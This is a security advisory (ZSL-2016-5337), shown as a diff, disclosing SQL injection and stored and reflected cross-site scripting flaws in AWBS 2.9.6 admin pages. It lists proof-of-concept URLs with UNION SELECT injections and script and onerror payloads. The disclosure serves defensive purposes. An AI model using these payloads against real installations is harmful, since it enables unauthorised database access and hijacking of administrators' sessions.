@@ -1,0 +1,100 @@
+AWBS v2.9.6 Multiple Remote Vulnerabilities
+
+
+Vendor: Total Online Solutions, Inc.
+Product web page: http://www.awbs.com
+Affected version: 2.9.6
+Platform: PHP
+
+Summary: Whether starting new or looking to expand your
+existing web hosting and/or domain registration business,
+the AWBS fully automated solutions and unique features will
+allow you achieve your goal with minimum effort and cost.
+
+Desc: AWBS suffers from multiple SQL Injection vulnerabilities.
+Input passed via the 'cat' and 'so' GET parameters are not properly
+sanitised before being returned to the user or used in SQL queries.
+This can be exploited to manipulate SQL queries by injecting arbitrary
+SQL code. Multiple cross-site scripting vulnerabilities were also
+discovered. The issue is triggered when input passed via multiple
+parameters is not properly sanitized before being returned to the
+user. This can be exploited to execute arbitrary HTML and script
+code in a user's browser session in context of an affected site.
+
+Tested on: Apache
+           PHP/5.3.28
+           MySQL/5.5.50-cll
+
+
+Vulnerability discovered by Bikramaditya Guha aka "PhoenixX"
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5337
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5337.php
+
+
+08.06.2016
+
+--
+
+
+1. SQL Injection:
+-----------------
+
+Parameter: cat, so (GET)
+POC URL:
+http://localhost/admin/omanage.php?search=1&cat=status%27&list=1&so=status
+http://localhost/admin/hostingadmin.php?list=f&so=domain%27
+http://localhost/admin/aomanage.php?search=1&cat=status%20UNION%20select%201,2,3,version%28%29,5,current_user,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--&list=3&so=status'
+http://localhost/admin/hostingarchiveadmin.php?search=1&cat=status UNION select 1--&list=1&so=status'
+http://localhost/admin/dsarchiveadmin.php?search=1&cat=status&list=3&so=31
+http://localhost/admin/domainadmin.php?search=&cat=&list=&sd=&so=100
+
+
+
+2. Cross-Site Scripting (Stored):
+---------------------------------
+
+http://localhost/admin/cmanage.php
+Parameters: reason (POST)
+
+Payload(s):
+%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+http://localhost/admin/helpdesk.php
+Parameters: hd_name, hd_url, hd_subject (POST)
+
+Payload(s):
+Content-Disposition: form-data; name="hd_name"
+
+"><script>alert(1)</script>
+-----------------------------28698210634144
+Content-Disposition: form-data; name="hd_url"
+
+"><script>alert(2)</script>
+-----------------------------28698210634144
+Content-Disposition: form-data; name="hd_subject"
+
+<img src=x onerror=alert(3)>
+-----------------------------28698210634144
+
+
+
+3. Cross-Site Scripting (Reflected):
+------------------------------------
+
+http://localhost/admin/useradmin.php
+Parameters: list (POST)
+
+http://localhost/admin/omanage.php?search=1%22%3E%3Cscript%3Ealert%283%29%3C/script%3E&cat=status%22%3E%3Cscript%3Ealert%284%29%3C/script%3E&list=4%22%3E%3Cscript%3Ealert%282%29%3C/script%3E&so=status%22%3E%3Cscript%3Ealert%281%29%3C/script%3E
+Parameters: search, cat, list, so (GET)
+
+http://localhost/admin/ccmanage.php?find_enc=1&list=1%22%3E%3Cscript%3Ealert%281%29%3C/script%3E
+Parameter: list (GET)
+
+http://localhost/admin/cmanage.php?edit=1&action=edit&add_credits=1&id=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E&search=&cat=&list=&sd=%22%3E%3Cscript%3Ealert%282%29%3C/script%3E
+Parameters: id, sd (GET)
+
+Payload(s):
+%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
